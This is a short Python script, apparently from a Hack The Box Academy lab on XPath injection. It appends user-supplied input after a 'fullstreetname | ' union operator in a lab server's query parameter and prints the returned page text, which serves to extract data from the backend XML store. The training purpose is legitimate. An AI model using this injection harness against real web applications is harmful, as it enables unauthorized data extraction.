# XPath - Advanced Data Exfiltration
# https://academy.hackthebox.com/module/204/section/2221

import requests
import re
from bs4 import BeautifulSoup

baseurl = 'http://83.136.254.53:30630/index.php?q=test&f=fullstreetname+|+' # IP spawned from HTB

f_param = input('Enter a parameter for "f": ') 

r = requests.get(baseurl+f_param)

webresponse = r.text

if re.findall(r'No Results!', webresponse):
    print("Nothing found!")
else:
    soup = BeautifulSoup(r.content, "html.parser")
    tag = soup.body
    for string in tag.strings:
        print(string)

